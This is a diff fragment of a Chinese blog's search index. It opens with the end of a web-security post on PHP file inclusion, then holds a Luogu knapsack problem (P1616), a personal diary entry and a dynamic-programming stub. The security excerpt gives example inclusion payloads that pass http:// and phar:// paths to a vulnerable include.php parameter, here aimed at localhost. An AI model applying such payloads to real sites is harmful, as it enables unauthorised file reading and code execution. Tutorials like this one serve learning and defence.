+http://user:password@example.com
+https://example.com
+https://example.com/file.php?var1=val1&amp;var2=val2
+https://user:password@example.com
+</code></pre>
+<p>示例：<br><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></p>
+<h3 id="phar-x2F-x2F-协议"><a href="#phar-x2F-x2F-协议" class="headerlink" title="phar:&#x2F;&#x2F; 协议"></a>phar:&#x2F;&#x2F; 协议</h3><p>phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
+<p><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></p>
 ]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>洛谷p1616</title>
+    <url>/2023/04/19/%E6%B4%9B%E8%B0%B7p1616/</url>
+    <content><![CDATA[<h1 id="疯狂的采药"><a href="#疯狂的采药" class="headerlink" title="疯狂的采药"></a>疯狂的采药</h1><h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>此题为纪念 LiYuxiang 而生。</p>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>LiYuxiang 是个天资聪颖的孩子，他的梦想是成为世界上最伟大的医师。为此，他想拜附近最有威望的医师为师。医师为了判断他的资质，给他出了一个难题。医师把他带到一个到处都是草药的山洞里对他说：“孩子，这个山洞里有一些不同种类的草药，采每一种都需要一些时间，每一种也有它自身的价值。我会给你一段时间，在这段时间里，你可以采到一些草药。如果你是一个聪明的孩子，你应该可以让采到的草药的总价值最大。”</p>
+<p>如果你是 LiYuxiang，你能完成这个任务吗？</p>
+<p>此题和原题的不同点：</p>
+<p>$1$. 每种草药可以无限制地疯狂采摘。</p>
+<p>$2$. 药的种类眼花缭乱，采药时间好长好长啊！师傅等得菊花都谢了！</p>
+<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入第一行有两个整数，分别代表总共能够用来采药的时间 $t$ 和代表山洞里的草药的数目 $m$。</p>
+<p>第 $2$ 到第 $(m + 1)$ 行，每行两个整数，第 $(i + 1)$ 行的整数 $a_i, b_i$ 分别表示采摘第 $i$ 种草药的时间和该草药的价值。</p>
+<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一行，这一行只包含一个整数，表示在规定的时间内，可以采到的草药的最大总价值。</p>
+<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><pre><code>70 3
+71 100
+69 1
+1 2
+</code></pre>
+<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><pre><code>140
+</code></pre>
+<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><h4 id="数据规模与约定"><a href="#数据规模与约定" class="headerlink" title="数据规模与约定"></a>数据规模与约定</h4><ul>
+<li>对于 $30%$ 的数据，保证 $m \le 10^3$ 。</li>
+<li>对于 $100%$ 的数据，保证 $1 \leq m \le 10^4$，$1 \leq t \leq 10^7$，且 $1 \leq m \times t \leq 10^7$，$1 \leq a_i, b_i \leq 10^4$。</li>
+</ul>
+<blockquote>
+<p>显然这个一个完全背包问题，对于完全背包问题的求解</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>动态规划</tag>
+        <tag>背包问题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>应是天仙狂醉，乱把白云揉碎</title>
+    <url>/2023/04/18/%E5%BA%94%E6%98%AF%E5%A4%A9%E4%BB%99%E7%8B%82%E9%86%89%EF%BC%8C%E4%B9%B1%E6%8A%8A%E7%99%BD%E4%BA%91%E6%8F%89%E7%A2%8E/</url>
+    <content><![CDATA[<blockquote>
+<p>人是一根会思想的苇草</p>
+</blockquote>
+<p>这是一场非正式会谈，我与我的。</p>
+<p>我这一生最讨厌三种人，欺骗、不守约定、孰若无睹，事实上，无比憎恨。</p>
+<p>想必这和我的经历有关，但我也不愿提及，就此散去吧。</p>
+<p>忽然想来，18年来，没有一日不彷徨无知，我还未曾真正瞧过自己一眼，或许瞧过，未曾入眼。</p>
+<p>讨厌的事情总是莫名其妙，就好像我不喜欢下雨，却又喜欢淋雨，或许这就是我的归宿，我也无力改变，但是我又的的确确要做些什么。倘若什么都不做，任由雨打满身，那也有点可悲，我不惧雨淋，不惧湿身，但也要在淋雨时迎风跑起，让那雨更猛烈的捶打着我，下次再遇见这雨，可就亲切又自然了。</p>
+<p>雨淋多了，总是会生病的。可能我也病了，我也不例外，这世界上病的人当然很多，病的千奇百怪，却没有人与我相似。在迷茫中寻求希望，未免是有点天真无知的。我不妄想希望的存在，我想成为自己的希望，千真万确。虽然听起来，更像是妄想。</p>
+<p>我又何尝不知我是在画地为牢，那又如何，属于我的一隅之地，也容许我孤芳自赏，这里不因是我的囚笼，这是我的天堂，我孤身起舞，不辜负我孤傲的人生。</p>
+<blockquote>
+<p>2023 4 18 萃文楼<br> 无法顶格空格的事，姑且下次再谈吧</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>日常</category>
+      </categories>
+      <tags>
+        <tag>不是好事</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>动态规划(一)</title>
+    <url>/2023/04/19/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E4%B8%80/</url>
+    <content><![CDATA[<blockquote>
+<p>注：本文思路来源于左程云老师</p>
+</blockquote>
+<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2>]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>动态规划</tag>
+      </tags>
   </entry>
 </search>
